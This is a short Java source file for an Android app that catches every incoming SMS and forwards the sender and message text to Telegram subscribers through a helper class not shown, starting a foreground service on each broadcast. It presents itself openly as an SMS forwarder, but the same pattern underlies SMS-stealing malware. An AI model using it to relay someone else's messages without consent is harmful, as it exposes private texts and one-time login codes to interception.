package com.smstofred;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Запускаем сервис, если его нет
        context.startForegroundService(new Intent(context, TelegramService.class));

        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;
            StringBuilder fullMessage = new StringBuilder();
            String sender = null;
            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                if (sender == null) sender = sms.getOriginatingAddress();
                fullMessage.append(sms.getMessageBody());
            }
            if (sender != null && fullMessage.length() > 0) {
                String text = "📨 От: " + sender + "\n💬 " + fullMessage.toString();
                TelegramSender.sendToAllSubscribers(context, text);
            }
        }
    }
}
